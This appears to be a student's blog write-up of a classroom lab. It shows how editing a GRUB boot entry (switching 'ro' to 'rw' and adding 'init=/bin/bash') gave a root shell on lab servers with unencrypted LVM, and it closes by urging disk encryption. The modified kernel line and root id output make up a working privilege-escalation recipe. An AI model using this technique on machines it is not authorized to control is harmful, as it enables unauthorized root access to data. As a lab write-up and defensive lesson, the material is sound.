## Context

During a network security class, I had a lab with seven servers on a Proxmox instance created by our teacher without a root user.

After I reported all privilege escalation paths using `sudo` commands, my teacher decided to disable every `sudo` command until he could find a solution.

Unfortunately, it was not enough.

## Privilege escalation

GRUB is a bootloader that lets you choose which operating system to boot.

It was installed on the servers, and I could edit the startup scripts:

```bash
recordfail
load_video
gfxmode $linux_gfx_mode
insmod gzio
if [ x$grub_platform = xxen ]; then insmod xzio; insmod lzopio; fi
insmod part_gpt
insmod ext2
search --no-floppy --fs-uuid --set=root <UUID>
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> ro quiet splash $vt_handoff
initrd /boot/initrd.img-5.15.0-56-generic
```

In our case, the LVM was not encrypted, so we could access the files by spawning a root shell:

```bash
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> ro quiet splash $vt_handoff
```

Just change `ro` (read-only) to `rw` (read-write), add `init=/bin/bash` at the end of the line, and reboot the server.

```bash
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> rw quiet splash $vt_handoff init=/bin/bash
```

We can now access the root user.

```bash
root@(none):/$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

Please encrypt your LVMs. Imagine this was not a lab, but an enterprise laptop with confidential documents.
When LVM is encrypted, changing `ro` to `rw` in the GRUB entry is not enough to read files because the passphrase is required.
